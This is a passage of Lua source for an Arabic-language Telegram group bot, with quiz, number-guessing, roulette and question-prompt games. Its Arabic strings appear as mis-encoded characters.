name = string.gsub(name,'Ψ°ΩΨ¨','β β« Ψ§Ψ΅ΩΨ± Ψ§ΩΩΩΩ Ψ³Ψ§Ψ±Ω ΨΉΩΩΩ Ψ§ΩΩ Ψ§ΩΩΩΩ ΩΨ­Ψ§Ψ±ΩΩΩ ΩΨ°ΩΨ° Ψ§ΩΩΩΩ Ψ\n1- ΩΨ­Ψ§Ψ³\n2- Ψ§ΩΩΨ§Ψ³\n3- Ψ°ΩΨ¨')
name = string.gsub(name,'Ψ­Ψ±Ω Ψ§ΩΨ§Ω','β β« ΩΩΩΩ° Ψ§ΩΩΩΩ Ψ«ΩΨ§Ψ«Ψ© ΩΩΩΩ ΩΩΩΩ° Ψ§ΩΩΩΨ§Ψ± ΩΨ§Ψ­Ψ―Ω ΩΩΨ§ ΩΩ Ψ\n1- Ψ­Ψ±Ω Ψ§ΩΨ¨Ψ§Ψ‘\n2- Ψ­Ψ±Ω Ψ§ΩΨ§Ω\n3- Ψ­Ψ±Ω Ψ§ΩΨ±Ψ§Ψ‘')
name = string.gsub(name,'Ψ§ΩΨΉΨ²Ψ§Ψ¦Ω','β β« ΨΉΩΩ ΩΨ―Ψ± Ψ§Ψ΅Ω Ψ§ΩΨΉΨ²Ω ΨͺΨ£ΨͺΩ Ψ\n1- Ψ§ΩΨΉΨ²Ψ§Ψ¦Ω\n2- Ψ§ΩΩΩΨ§Ψ±Ω\n3- Ψ§ΩΩΨ¨Ψ§Ψ¦Ψ¨')
name = string.gsub(name,'Ψ§ΩΨ³Ψ§Ψͺ','β β« ΩΨ§ΩΩ Ψ¬ΩΨΉ ΩΩΩΩ Ψ§ΩΨ³Ω Ψ\n1- Ψ³ΩΨ―Ψ§Ψͺ\n2- Ψ§ΩΨ³Ψ§Ψͺ\n3- ΩΩΨ§ΩΨ΅')
name = string.gsub(name,'Ψ§ΩΩΩΨ¬ΩΩΩ','β β« Ψ§ΩΩ Ψ§ΨͺΨ³ΨΉΩΩΨͺ ΩΨ―ΩΩΨ§ ΩΩΩΩ° Ψ§ΩΨ­Ψ±ΩΨ¨ Ψ\n1- Ψ§ΩΨ΅Ψ§Ψ±ΩΨ?\n2- Ψ§ΩΩΨ³Ψ―Ψ³\n3- Ψ§ΩΩΩΨ¬ΩΩΩ')
name = string.gsub(name,'Ψ§Ψ³ΩΨ§','β β« ΨͺΩΨΉ ΩΨ¨ΩΨ§Ω ΩΩΩΩ° ΩΨ§Ψ±Ω Ψ\n1- Ψ§ΩΨ±ΩΩΩΨ§\n2- Ψ§Ψ³ΩΨ§\n3- Ψ§ΩΨ±ΩΩΨ§ Ψ§ΩΨ΄ΩΨ§ΩΩΩ')
name = string.gsub(name,'6','β β« ΩΩ Ψ΅ΩΨ±Ψ§ ΩΩΩΩΩΩΩ Ψ\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'Ψ§ΩΨ§Ψ³Ψ―','β β« ΩΨ§ΩΩ Ψ§ΩΨ­ΩΩΨ§Ω Ψ§ΩΨ°Ω ΩΩΩΨ¨ Ψ¨ΩΩΩ Ψ§ΩΨΊΨ§Ψ¨Ω Ψ\n1- Ψ§ΩΩΩΩΩ°Ω\n2- Ψ§ΩΨ§Ψ³Ψ―\n3- Ψ§ΩΩΩΨ±')
name = string.gsub(name,'ΩΩΨ±','β β« ΩΨ§ Ψ§Ψ³Ω Ψ΅ΨΊΩΨ± Ψ§ΩΨ­Ψ΅Ψ§Ω Ψ\n1- ΩΩΨ±\n2- Ψ¬Ψ±Ω\n3- ΨΉΨ¬Ω')
name = string.gsub(name,'Ψ§ΩΨ―ΩΩΩΩΩΩ°Ω','β β« ΩΨ§ Ψ§ΩΨ­ΩΩΨ§Ω Ψ§ΩΨ°Ω ΩΩΨ§Ω ΩΨ§Ψ­Ψ―Ω ΨΉΩΩΩ ΩΩΨͺΩΨ­Ω Ψ\n1- Ψ§ΩΩΨ±Ψ΄\n2- Ψ§ΩΨ―ΩΩΩΩΩΩ°Ω\n3- Ψ§ΩΨ«ΨΉΩΨ¨\n')
name = string.gsub(name,'Ψ§ΩΨ±ΩΨ¨Ψ§','β β« ΩΨ§ΩΩ Ψ§ΩΩΨ§Ψ±Ω Ψ§ΩΨͺΩ ΨͺΩΩΨ¨ Ψ¨Ψ§ΩΩΨ§Ψ±Ω Ψ§ΩΨΉΨ¬ΩΨ² Ψ\n1- Ψ§ΩΨ±ΩΨ¨Ψ§\n2- Ψ§ΩΨ±ΩΩΨ§ Ψ§ΩΨ΄ΩΨ§ΩΩΩ\n3- Ψ§ΩΨ±ΩΩΩΨ§')
name = string.gsub(name,'Ψ§ΩΨ²Ψ¦Ψ¨Ω','β β« ΩΨ§ Ψ§Ψ³Ω Ψ§ΩΩΨΉΨ―Ω Ψ§ΩΩΩΨ¬ΩΨ― ΩΩΩΩ°Ω Ψ§ΩΨ­Ψ§ΩΩ Ψ§ΩΨ³Ψ§Ψ¦ΩΩ Ψ\n1- Ψ§ΩΩΨ­Ψ§Ψ³\n2- Ψ§ΩΨ­Ψ―ΩΨ―\n3- Ψ§ΩΨ²Ψ¦Ψ¨Ω')
name = string.gsub(name,'ΩΩΨ―Ω','β β« ΩΨ§ΩΩ ΨΉΨ§Ψ΅ΩΩ Ψ§ΩΨ¬ΩΨͺΨ±Ψ§ Ψ\n1- ΩΩΨ―Ω\n2- ΩΩΨ±Ψ³ΩΩ\n3- ΨͺΨ±ΩΩΨ§')
name = string.gsub(name,'Ψ§ΩΨ§ΩΨ³Ψ§Ω','β β« ΩΨ§ΩΩ Ψ§ΩΨ΄Ψ¦ Ψ§ΩΨ°Ω Ψ¨Ψ±Ψ£Ψ³Ω Ψ³Ψ¨ΨΉ ΩΨͺΨ­Ψ§Ψͺ Ψ\n1- Ψ§ΩΩΨ§ΨͺΩ\n2- Ψ§ΩΨͺΩΩΨ§Ψ²\n3- Ψ§ΩΨ§ΩΨ³Ψ§Ω')
name = string.gsub(name,'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±','β β« ΩΨ§ΩΩ ΨΉΨ§Ψ΅ΩΩ Ψ§ΩΩΨ§Ψ¨Ψ§Ω Ψ\n1- Ψ¨Ψ§ΩΩΩΩ\n2- ΩΩΩ Ψ―ΩΩΩ\n3- Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±')
name = string.gsub(name,'Ψ?Ψ―ΩΨ¬Ω','β β« ΩΩ ΩΩ Ψ²ΩΨ¬Ω Ψ§ΩΨ±Ψ³ΩΩ Ψ§ΩΨ§ΩΨ¨Ψ± ΩΩΩ Ψ³ΩΨ’ Ψ\n1- Ψ­ΩΨΆΩ\n2- Ψ²ΩΩΨ¨\n3- Ψ?Ψ―ΩΨ¬Ω')
mustafaTEAM = name..'\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ¬ΩΨ§Ψ¨ Ψ§ΩΨ΅Ψ­ΩΨ­ ΩΩΨ·'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum8'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum8'..msg.chat_id_)
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ§Ψ³Ψ¦ΩΩ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
--     Source Escobar     --
if Devmfm:get(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_mfm(msg.chat_id_, msg.id_, 1,"β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΨ§ ΩΩΩΩΩ ΨͺΨ?ΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ¨Ψ± ΩΩ Ψ§ΩΩ20 Ψ?ΩΩ Ψ±ΩΩ ΩΨ§ Ψ¨ΩΩ Ψ§ΩΩ1 ΩΨ§ΩΩ20", 1, 'md')
return false  end 
local GETNUM = Devmfm:get(mustafa.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
Devmfm:del(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
Devmfm:del(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« *Ψ§ΩΨͺΨ?ΩΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­ ΩΩ* β '..NUM..'\nβ β« *ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΨ­Ψ΅ΩΨͺ ΨΉΩΩ 5 ΩΩΨ§Ψ· ΩΩΩΩΩ Ψ§Ψ³ΨͺΨ¨Ψ―Ψ§ΩΩΨ§ Ψ¨Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Devmfm:incrby(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(Devmfm:get(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
Devmfm:del(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
Devmfm:del(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« *Ψ§ΩΨͺΨ?ΩΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­ ΩΩ* β '..GETNUM..'\nβ β« *ΩΩΨ§Ψ³Ω ΩΩΨ― Ψ?Ψ³Ψ±Ψͺ Ψ­Ψ§ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ΩΨͺΨ?ΩΩΩ Ψ§ΩΨ±ΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­*', 1, 'md')
else
if tonumber(Devmfm:get(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'ΩΨ­Ψ§ΩΩΨͺΨ§Ω ΩΩΨ·'
elseif tonumber(Devmfm:get(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'ΩΨ­Ψ§ΩΩΩ ΩΨ§Ψ­Ψ―Ω ΩΩΨ·'
end
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩΨ― Ψ?ΩΩΨͺ Ψ§ΩΨ±ΩΩ Ψ§ΩΨ?Ψ·Ψ§ ΩΨͺΨ¨ΩΩ ΩΨ―ΩΩ '..SetNum..' Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ±ΩΩ ΨͺΨ?ΩΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ΩΩΩΩΨ²', 1, 'md')
end
end
end
end
if text == 'Ψ?ΩΩ' and ChCheck(msg) or text == 'ΨͺΨ?ΩΩΩ' and ChCheck(msg) then   
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
Devmfm:set(mustafa.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ’ΩΩΩΩΩΨ’ Ψ¨Ω ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ ΩΩΩΩ° ΩΨΉΨ¨Ψ© Ψ§ΩΨͺΨ?ΩΩΩ β β₯‘\n ββββ EB ββββ\nβ β« Ψ³ΩΨͺΩ ΨͺΨ?ΩΩΩ ΨΉΨ―Ψ― ΩΨ§ Ψ¨ΩΩ Ψ§ΩΩ1 ΩΨ§ΩΩ20 Ψ§Ψ°Ψ§ ΨͺΨΉΨͺΩΨ― Ψ§ΩΩ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§ΩΩΩΨ² Ψ¬Ψ±Ψ¨ ΩΨ§ΩΩΨΉΨ¨ Ψ§ΩΨ§Ω .\nβ β« ΩΩΨ§Ψ­ΨΈΩ ΩΨ―ΩΩ Ψ«ΩΨ§Ψ« ΩΨ­Ψ§ΩΩΨ§Ψͺ ΩΩΨ· ΩΩΨ± ΩΨ¨Ω Ψ§Ψ±Ψ³Ψ§Ω ΨͺΨ?ΩΩΩΩ !', 1, 'md')
Devmfm:setex(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Escobar     --
if text == 'Ψ±ΩΩΩΨͺ' then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm:del(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
Devmfm:del(mustafa..'mfm:ListRolet'..msg.chat_id_)  
Devmfm:setex(mustafa.."mfm:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ­Ψ³ΩΨ§ ΩΩΩΨΉΨ¨ , Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΨΉΨ―Ψ― Ψ§ΩΩΨ§ΨΉΨ¨ΩΩ ΩΩΨ±ΩΩΩΨͺ .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and Devmfm:get(mustafa.."mfm:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ¨Ψ―Ψ‘ Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? Ψ¨ΩΨ§ΨΉΨ¨ ΩΨ§Ψ­Ψ― ΩΩΨ·"
else
Devmfm:set(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = 'β β« ΨͺΩΩΩΩ Ψ¨Ψ―Ψ‘ ΨͺΨ³Ψ¬ΩΩ Ψ§ΩΩΨ³ΨͺΩ ΩΨ±Ψ¬Ω Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ \nβ β« Ψ§ΩΩΨ§Ψ¦Ψ² ΩΨ­Ψ΅Ω ΨΉΩΩ 5 ΩΩΨ§Ψ· ΨΉΨ―Ψ― Ψ§ΩΩΨ·ΩΩΨ¨ΩΩ β '..text..' ΩΨ§ΨΉΨ¨'
end
Devmfm:del(mustafa.."mfm:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and Devmfm:get(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if Devmfm:sismember(mustafa..'mfm:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'β β« Ψ§ΩΩΨΉΨ±Ω β ['..text..'] ΩΩΨ¬ΩΨ― Ψ§Ψ³Ψ§Ψ³Ψ§')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­ ΩΨ±Ψ¬Ω Ψ§Ψ±Ψ³Ψ§Ω ΩΨΉΨ±Ω Ψ΅Ψ­ΩΨ­', 1, 'md')
return false 
end
Devmfm:sadd(mustafa..'mfm:ListRolet'..msg.chat_id_,text)
local CountAdd = Devmfm:get(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = Devmfm:scard(mustafa..'mfm:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
Devmfm:del(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
Devmfm:setex(mustafa.."mfm:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "β β« ΨͺΩΩΩΩ Ψ§Ψ―Ψ?Ψ§Ω Ψ§ΩΩΨΉΨ±Ω β ["..text.."]\nβ β« ΩΨͺΩ Ψ§ΩΨͺΩΨ§Ω Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΩΩΩ ΩΩ Ψ§ΩΨͺ ΩΨ³ΨͺΨΉΨ― Ψ"
keyboard = {} 
keyboard.inline_keyboard = {{{text="ΩΨΉΩ",callback_data="/YesRolet"},{text="ΩΨ§",callback_data="/NoRolet"}},{{text="Ψ§ΩΩΨ§ΨΉΨ¨ΩΩ",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "β β« ΨͺΩΩΩΩ Ψ§Ψ―Ψ?Ψ§Ω Ψ§ΩΩΨΉΨ±Ω β ["..text.."] ΩΨͺΨ¨ΩΩ β "..CountUser.." ΩΨ§ΨΉΨ¨ΩΩ ΩΩΩΨͺΩΩ Ψ§ΩΨΉΨ―Ψ― Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΩΨΉΨ±Ω Ψ§ΩΨ§Ψ?Ψ±"
keyboard = {} 
keyboard.inline_keyboard = {{{text="Ψ§ΩΨΊΨ§Ψ‘",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source Escobar     --
if text == 'ΩΨͺ ΨͺΩΩΨͺ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
local mustafaTEAM = {  
'Ψ’Ψ?Ψ± ΩΨ±Ψ© Ψ²Ψ±Ψͺ ΩΨ―ΩΩΨ© Ψ§ΩΩΩΨ§ΩΩΨ','Ψ’Ψ?Ψ± ΩΨ±Ψ© Ψ£ΩΩΨͺ Ψ£ΩΩΨͺΩ Ψ§ΩΩΩΨΆΩΩΨ©Ψ','Ψ§ΩΩΨΆΨΉ Ψ§ΩΨ­Ψ§ΩΩΨ\nβ1. Ψ³ΩΨ±Ψ§Ω\nβ2. ΨΆΨ§ΩΨ¬\nβ3. Ψ£ΨͺΨ£ΩΩ','Ψ’Ψ?Ψ± Ψ΄ΩΨ‘ ΨΆΨ§ΨΉ ΩΩΩΨ','ΩΩΩΨ© Ψ£Ψ?ΩΨ±Ψ© ΩΨ΄Ψ§ΨΊΩ Ψ§ΩΨ¨Ψ§ΩΨ','Ψ·Ψ±ΩΩΨͺΩ Ψ§ΩΩΨΉΨͺΨ§Ψ―Ψ© ΩΩΩΩ° Ψ§ΩΨͺΨ?ΩΩΨ΅ ΩΩ Ψ§ΩΨ·Ψ§ΩΨ© Ψ§ΩΨ³ΩΨ¨ΩΨ©Ψ','Ψ΄ΩΨ± ΩΩ Ψ£Ψ΄ΩΨ± Ψ§ΩΨΉΨ§Ω ΩΩ Ψ°ΩΨ±Ω Ψ¬ΩΩΩΨ© ΩΨΉΩΨ','ΩΩΩΨ© ΨΊΨ±ΩΨ¨Ψ© ΩΩ ΩΩΨ¬ΨͺΩ ΩΩΨΉΩΨ§ΩΨ§Ψπ€','β- Ψ΄ΩΨ‘ Ψ³ΩΨΉΨͺΩ ΨΉΨ§ΩΩ ΩΩΩΩ° Ψ°ΩΩΩ ΩΨ§ΩΩΩΩΩΩΨ','ΩΨͺΩ ΨͺΩΨ±Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω Ψ£ΩΨ§ΩΩ Ψ­ΨͺΩ ΩΩ ΩΩΨͺ ΩΩΩ Ψ£Ψ΄Ψ― ΩΨΉΨ¬Ψ¨ΩΩΩΨ','β- Ψ£Ψ¨Ψ±Ψ² Ψ΅ΩΨ© Ψ­Ψ³ΩΨ© ΩΩΩΩ° Ψ΅Ψ―ΩΩΩ Ψ§ΩΩΩΨ±Ψ¨Ψ','ΩΩ ΨͺΨ΄ΨΉΨ± Ψ£Ω ΩΩΩΨ’ΩΩ ΩΩΩ ΩΩΨ­Ψ¨ΩΨ','Ψ§Ψ°Ψ§ Ψ§ΩΨͺΨ΄ΩΨͺ Ψ£Ω Ψ£ΨΉΨ² Ψ£Ψ΅Ψ―ΩΨ§Ψ¦Ω ΩΨΆΩΨ± ΩΩ Ψ§ΩΨ³ΩΨ‘Ψ ΩΩΩΩΩ Ψ§ΩΨ΅Ψ±ΩΨ­Ψ','Ψ£Ψ¬ΩΩ Ψ΄ΩΨ‘ Ψ­Ψ΅Ω ΩΨΉΩ Ψ?ΩΨ§Ω ΩΨ§ΩΩΩΩΨ','Ψ΅ΩΩ Ψ΄ΨΉΩΨ±Ω ΩΨ£ΩΨͺ ΨͺΩΨ­Ψ¨ Ψ΄Ψ?Ψ΅ ΩΩΨ­Ψ¨ ΨΊΩΨ±ΩΨππ','ΩΩΩΨ© ΩΨ΄Ψ?Ψ΅ ΨΊΨ§ΩΩ Ψ§Ψ΄ΨͺΩΨͺ Ψ₯ΩΩΩΨπ','Ψ’Ψ?Ψ± Ψ?Ψ¨Ψ± Ψ³ΨΉΩΨ―Ψ ΩΨͺΩ ΩΨ΅ΩΩΨ','Ψ£ΩΨ§ Ψ’Ψ³Ω ΨΉΩΩ ....Ψ','Ψ£ΩΨ΅Ω ΩΩΨ³Ω Ψ¨ΩΩΩΨ©Ψ','Ψ΅Ψ±ΩΨ­Ψ ΩΨ΄ΨͺΨ§ΩΨ','β- Ψ΅Ψ±ΩΨ­Ψ ΩΩ Ψ³Ψ¨Ω ΩΨ?Ψ°ΩΨͺ Ψ£Ψ­Ψ―ΩΩ ΩΩΩ ΨΉΩ ΨΊΩΨ± ΩΨ΅Ψ―Ψ','β- ΩΨ§Ψ°Ψ§ Ψ³ΨͺΨ?ΨͺΨ§Ψ± ΩΩ Ψ§ΩΩΩΩΨ§Ψͺ ΩΨͺΨΉΨ¨Ψ± ΩΩΨ§ ΨΉΩ Ψ­ΩΨ§ΨͺΩ Ψ§ΩΨͺΩ ΨΉΨ΄ΨͺΩΨ§ Ψ§ΩΩ Ψ§ΩΨ’ΩΨπ­','β- ΩΩΨ§Ω/Ψ© ΨͺΩΨ― ΩΩ ΩΨ―ΨΉΩΩΩ ΨΉΩΩ ΩΨ§Ψ¦Ψ―Ψ© ΨΉΨ΄Ψ§Ψ‘Ψπβ€','β- ΨͺΨ?ΩΩΩ Ψ΄ΩΨ‘ ΩΨ― ΩΨ­Ψ―Ψ« ΩΩΩΩ° Ψ§ΩΩΨ³ΨͺΩΨ¨ΩΨ','β- ΩΩΨ΄Ψ¨Ψ§Ψ¨ | Ψ’Ψ?Ψ± ΩΨ±Ψ© ΩΨ΅ΩΩ ΨΊΨ²Ω ΩΩ ΩΨͺΨ§Ψ©Ψπ','Ψ΄Ψ?Ψ΅ Ψ£Ω Ψ΅Ψ§Ψ­Ψ¨ ΨΉΩΨΆΩ ΩΩΨ³Ψ§Ω ΩΩΨ± Ψ§ΩΨ­ΩΨ§Ψ© ΩΨ§ Ψ§Ψ³ΩΩ Ψ','| Ψ§Ψ°Ψ§ Ψ΄ΩΨͺ Ψ­Ψ― ΩΨ§ΨΉΨ¬Ψ¨Ω ΩΨΉΩΨ―Ω Ψ§ΩΨ¬Ψ±Ψ£Ω Ψ§ΩΩ ΨͺΨ±ΩΨ­ ΩΨͺΨͺΨΉΨ±Ω ΨΉΩΩΩ Ψ ΩΩΨ―ΩΨ© Ψ§ΩΨ­Ψ―ΩΨ« Ψ΄Ω Ψ±Ψ§Ψ­ ΨͺΩΩΩ Ψ.','ΩΩ ΩΨ±Ω ΨͺΨ³Ψ¨Ψ­ Ψ¨Ψ§ΩΩΩΩ','ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨΉΨ§Ψ³ ΨΉΩΨ―Ω Ψ­Ψ§ΩΩΩΨ§Ψ','ΩΩ ΩΩΨ· ΩΨ³ΩΩΨ­ Ψ΄Ψ?Ψ΅ ΩΨ§Ψ­Ψ― ΨͺΨͺΨ§Ψ¨ΨΉΩ ΩΨ§ΩΨ³ΩΨ§Ψ¨ ΩΩΩ Ψ¨ΩΩΩΩ Ψ','ΩΩΩΩ ΩΩΨ§Ψ¨Ψ³Ω ΨͺΩΩΩ ΩΨ§Ψ±ΩΨ© Ψ','ΩΨ΄ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΩ ΨͺΨ·ΩΨΉ Ψ­Ψ±ΨͺΩ ΩΩΩΩ°Ω Ω Ψ²ΨΉΩΨͺ Ψ','ΨΉΩΨ―Ω Ψ£Ψ?ΩΨ§Ω Ψ§Ω Ψ?ΩΨ§Ψͺ ΩΩ Ψ§ΩΨ±ΨΆΨ§ΨΉΨ©Ψ','ΨΉΩΨ―Ω ΩΨΉΨ¬Ψ¨ΩΩ ΩΩΨ§ ΩΨ­Ψ― Ψ―Ψ±Ψ§ ΨΉΩΩΨ',
'Ψ£Ψ·ΩΩ ΩΨ―Ψ© ΩΨΆΩΨͺΩΨ§ Ψ¨ΨΉΩΨ― ΨΉΩ Ψ£ΩΩΩ Ψ','ΩΩ ΩΨ¬Ω ΨΉΩΨ― ΩΩΩΨ§Ψ―Ω ΨͺΨͺΩΩΨΉ ΩΨ¬ΩΩ ΩΨ―ΩΨ©Ψ','ΩΨ¨Ψ§Ω ΨΉΩΩΩ Ψ§ΩΨ­Ψ²Ω ΩΩ " Ψ΅ΩΨͺΩ - ΩΩΨ§ΩΨ­Ω','ΩΩΩ ΨͺΨ΄ΩΩ ΩΩΨ³Ω Ψ¨ΨΉΨ― Ψ³ΩΨͺΩΩΨ','ΩΨ΄ ΩΩΩΩΩΩ ΩΩ ΩΩΨ§ ΨͺΨΊΩΩ Ψ','ΨΉΩΨ―Ω Ψ­Ψ³ ΩΩΨ§ΩΩ ΩΩΨ§ ΩΩΨ³ΩΨ©Ψ','ΩΩΩ ΨͺΨͺΨ΅Ψ±Ω ΩΨΉ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΩΨΆΩΩΩ Ψ','ΩΩΩ ΩΩ Ψ£Ψ­ΩΨ§Ω ΩΩΨ¨ΩΨ','Ψ­Ψ§Ψ¬Ψ© ΨͺΨ΄ΩΩ ΩΩΨ³Ω ΩΨ¨Ψ―ΨΉ ΩΩΩΩ°ΩΨ§ Ψ','ΩΨͺΩ Ψ­Ψ¨ΩΨͺΨ','Ψ΄ΩΨ‘ ΩΩ Ω ΨͺΨ°ΩΨ±ΨͺΩ ΨͺΨ¨ΨͺΨ³Ω ...','Ψ§ΩΨΉΩΨ§ΩΩ Ψ§ΩΨ³Ψ±ΩΩ Ψ―Ψ§ΩΩΨ§Ω ΨͺΩΩΩ Ψ­ΩΩΩΨ','Ψ΅ΩΨͺ ΩΨΊΩΩ Ω ΨͺΨ­Ψ¨Ω','ΩΩ ΩΨ¬Ω ΨΉΩΨ― ΩΩΩΨ§Ψ―Ω ΨͺΨͺΩΩΨΉ ΩΨ¬ΩΩ ΩΨ―ΩΨ©Ψ','Ψ§Ψ°Ψ§ Ψ§Ψ­Ψ― Ψ³Ψ£ΩΩ ΨΉΩ Ψ΄ΩΨ‘ Ω ΨͺΨΉΨ±ΩΩ ΨͺΩΩΩ Ω Ψ§ΨΉΨ±Ω ΩΩΨ§ ΨͺΨͺΩΩΨ³Ω Ψ','ΩΨΉ Ψ§Ω ΨΆΨ― : Ψ§ΩΩΩΩ Ψ§ΩΨΆΩ Ψ­Ω ΩΩ ΩΨ΄Ψ§ΩΩ Ψ§ΩΨ­ΩΨ§Ψ©Ψ','ΩΨ³Ψ§Ψ­Ψ© ΩΨ§Ψ±ΨΊΨ© (..............) Ψ§ΩΨͺΨ¨ Ψ§Ω Ψ΄ΩΨ‘ ΨͺΨ¨ΩΩ','Ψ§ΨΊΨ±Ψ¨ Ψ§Ψ³Ω ΩΨ± ΨΉΩΩΩ Ψ','ΨΉΩΨ±Ω ΩΩΩΨͺ ΩΩΩΨ³ Ψ§Ψ­Ψ― ΨΊΩΨ± Ψ¬ΩΨ³ΩΨ','Ψ§Ψ°Ψ§ ΨΊΩΨ·Ψͺ ΩΨΉΨ±ΩΨͺ Ψ§ΩΩ ΨΊΩΨ·Ψ§Ω ΨͺΨ­Ψ¨ ΨͺΨΉΨͺΨ±Ω ΩΩΨ§ ΨͺΨ¬Ψ­Ψ―Ψ','ΩΩ ΨΉΩΨ―Ω ΩΩΩΨ³ ΩΨ΄ Ψ§ΩΨ³ΩΨ§Ψ±Ψ© Ψ§ΩΩΩ 